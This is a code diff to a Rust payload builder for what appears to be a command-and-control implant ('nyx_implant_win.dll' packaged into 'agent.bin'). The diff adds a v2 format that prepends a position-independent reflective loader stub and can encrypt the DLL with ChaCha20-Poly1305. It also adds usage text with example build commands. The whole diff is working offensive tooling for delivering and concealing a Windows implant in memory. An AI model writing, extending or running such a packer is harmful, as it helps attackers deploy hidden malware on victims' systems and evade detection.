@@ -43,7 +43,7 @@ use std::fs;
 use std::path::PathBuf;
 use std::process;
 
-const MAGIC: &[u8; 4] = b"NYX1";
+const MAGIC_V1: &[u8; 4] = b"NYX1";
 
 fn main() {
     let args: Vec<String> = env::args().collect();
@@ -52,6 +52,9 @@ fn main() {
     }
     let dll = &args[1];
     let mut out = PathBuf::from("agent.bin");
+    let mut format_v2 = false;
+    let mut loader = false;
+    let mut encrypt = false;
     let mut i = 2;
     while i < args.len() {
         match args[i].as_str() {
@@ -62,6 +65,27 @@ fn main() {
                     process::exit(2);
                 }
                 out = PathBuf::from(&args[i]);
+            }
+            "--format" => {
+                i += 1;
+                if i >= args.len() {
+                    eprintln!("error: --format needs a value (v1 or v2)");
+                    process::exit(2);
+                }
+                match args[i].as_str() {
+                    "v1" => format_v2 = false,
+                    "v2" => format_v2 = true,
+                    other => {
+                        eprintln!("error: unknown format '{}' (expected v1 or v2)", other);
+                        process::exit(2);
+                    }
+                }
+            }
+            "--loader" => {
+                loader = true;
+            }
+            "--encrypt" => {
+                encrypt = true;
             }
             "-h" | "--help" => {
                 usage(&args[0]);
@@ -74,6 +98,16 @@ fn main() {
         i += 1;
     }
 
+    // Validate flag combinations.
+    if loader && !format_v2 {
+        eprintln!("error: --loader requires --format v2");
+        process::exit(2);
+    }
+    if encrypt && !format_v2 {
+        eprintln!("error: --encrypt requires --format v2");
+        process::exit(2);
+    }
+
     let pe = match fs::read(dll) {
         Ok(b) => b,
         Err(e) => {
@@ -82,40 +116,121 @@ fn main() {
         }
     };
 
-    match extract(&pe) {
-        Ok((entry_rva, text)) => {
-            // Header: magic + entry offset (relative to text start) + text len + reserved.
-            let mut blob = Vec::with_capacity(16 + text.len());
-            blob.extend_from_slice(MAGIC);
-            blob.extend_from_slice(&(entry_rva as u32).to_le_bytes());
-            blob.extend_from_slice(&(text.len() as u32).to_le_bytes());
-            blob.extend_from_slice(&0u32.to_le_bytes()); // reserved
-            blob.extend_from_slice(&text);
-            match fs::write(&out, &blob) {
-                Ok(_) => {
-                    eprintln!(
-                        "wrote {} ({} bytes: 16-byte header + {} .text; entry @ +0x{:x})",
-                        out.display(),
-                        blob.len(),
-                        text.len(),
-                        entry_rva
-                    );
-                }
-                Err(e) => {
-                    eprintln!("error: write {}: {}", out.display(), e);
-                    process::exit(1);
+    if !format_v2 {
+        // ── v1: backward-compatible .text extraction ──────────────────────
+        match extract(&pe) {
+            Ok((entry_rva, text)) => {
+                let mut blob = Vec::with_capacity(16 + text.len());
+                blob.extend_from_slice(MAGIC_V1);
+                blob.extend_from_slice(&(entry_rva as u32).to_le_bytes());
+                blob.extend_from_slice(&(text.len() as u32).to_le_bytes());
+                blob.extend_from_slice(&0u32.to_le_bytes()); // reserved
+                blob.extend_from_slice(&text);
+                match fs::write(&out, &blob) {
+                    Ok(_) => {
+                        eprintln!(
+                            "wrote {} ({} bytes: 16-byte NYX1 header + {} .text; entry @ +0x{:x})",
+                            out.display(),
+                            blob.len(),
+                            text.len(),
+                            entry_rva
+                        );
+                    }
+                    Err(e) => {
+                        eprintln!("error: write {}: {}", out.display(), e);
+                        process::exit(1);
+                    }
                 }
             }
+            Err(e) => {
+                eprintln!("error: {}", e);
+                process::exit(1);
+            }
         }
-        Err(e) => {
-            eprintln!("error: {}", e);
-            process::exit(1);
+    } else if loader && encrypt {
+        // ── v2 + loader + encrypt: full reflective loader via nyx_loader ──
+        let config = nyx_loader::LoaderConfig::random();
+        let payload = nyx_loader::wrap_payload(&pe, &config);
+        match fs::write(&out, &payload) {
+            Ok(_) => {
+                eprintln!(
+                    "wrote {} ({} bytes: {}B PIC stub + NYX2 header + {}B encrypted DLL + 16B tag; format=v2 loader=yes encrypt=yes)",
+                    out.display(),
+                    payload.len(),
+                    nyx_loader::PIC_STUB_LEN,
+                    pe.len(),
+                );
+            }
+            Err(e) => {
+                eprintln!("error: write {}: {}", out.display(), e);
+                process::exit(1);
+            }
+        }
+    } else if loader {
+        // ── v2 + loader (no encrypt): stub + NYX2 header + raw DLL ──────
+        use nyx_loader::stub::{PIC_STUB, NYX2_MAGIC};
+        let dll_len = pe.len() as u32;
+        let mut payload = Vec::with_capacity(PIC_STUB.len() + 4 + 4 + 12 + pe.len());
+        payload.extend_from_slice(PIC_STUB);
+        payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());
+        payload.extend_from_slice(&dll_len.to_le_bytes());
+        payload.extend_from_slice(&[0u8; 12]); // zero nonce (no encryption)
+        payload.extend_from_slice(&pe);
+        match fs::write(&out, &payload) {
+            Ok(_) => {
+                eprintln!(
+                    "wrote {} ({} bytes: {}B PIC stub + NYX2 header + {}B raw DLL; format=v2 loader=yes encrypt=no)",
+                    out.display(),
+                    payload.len(),
+                    PIC_STUB.len(),
+                    pe.len(),
+                );
+            }
+            Err(e) => {
+                eprintln!("error: write {}: {}", out.display(), e);
+                process::exit(1);
+            }
+        }
+    } else {
+        // ── v2 bare (no loader, no encrypt): NYX2 header + raw DLL ──────
+        use nyx_loader::stub::NYX2_MAGIC;
+        let dll_len = pe.len() as u32;
+        let mut payload = Vec::with_capacity(4 + 4 + 12 + pe.len());
+        payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());
+        payload.extend_from_slice(&dll_len.to_le_bytes());
+        payload.extend_from_slice(&[0u8; 12]); // zero nonce (no encryption)
+        payload.extend_from_slice(&pe);
+        match fs::write(&out, &payload) {
+            Ok(_) => {
+                eprintln!(
+                    "wrote {} ({} bytes: NYX2 header + {}B raw DLL; format=v2 loader=no encrypt=no)",
+                    out.display(),
+                    payload.len(),
+                    pe.len(),
+                );
+            }
+            Err(e) => {
+                eprintln!("error: write {}: {}", out.display(), e);
+                process::exit(1);
+            }
         }
     }
 }
 
 fn usage(prog: &str) -> ! {
-    eprintln!("usage: {} <nyx_implant_win.dll> [-o agent.bin]", prog);
+    eprintln!("usage: {} <nyx_implant_win.dll> [options]", prog);
+    eprintln!();
+    eprintln!("options:");
+    eprintln!("  -o, --output <path>   Output file path (default: agent.bin)");
+    eprintln!("  --format v1|v2        Payload format (default: v1)");
+    eprintln!("  --loader              Embed PIC reflective loader stub (requires --format v2)");
+    eprintln!("  --encrypt             ChaCha20-Poly1305 encrypt the DLL portion (requires --format v2)");
+    eprintln!("  -h, --help            Show this help");
+    eprintln!();
+    eprintln!("examples:");
+    eprintln!("  {} implant.dll                          # v1: .text extraction -> agent.bin", prog);
+    eprintln!("  {} implant.dll -o payload.bin           # v1 with custom output", prog);
+    eprintln!("  {} implant.dll --format v2 --loader --encrypt  # v2: full reflective loader", prog);
     process::exit(2);
 }
 
